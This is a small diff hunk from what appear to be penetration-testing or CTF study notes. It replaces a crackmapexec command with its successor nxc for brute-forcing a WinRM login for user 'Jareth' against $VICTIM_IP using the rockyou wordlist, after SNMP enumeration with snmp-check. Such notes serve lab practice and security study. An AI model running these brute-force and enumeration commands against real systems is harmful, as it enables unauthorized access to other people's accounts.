@@ -27,7 +27,7 @@ snmp-check -c openview $VICTIM_IP
 3. Looking through the results if we find a non default username we can bruteforce it 
 
 ```
-crackmapexec winrm $VICTIM_IP -u Jareth -p $WORDLIST_PATH/rockyou.txt | grep '(Pwn3d!)'
+nxc winrm $VICTIM_IP -u Jareth -p $WORDLIST_PATH/rockyou.txt | grep '(Pwn3d!)'
 ```
 
 4. if you found creds then connect
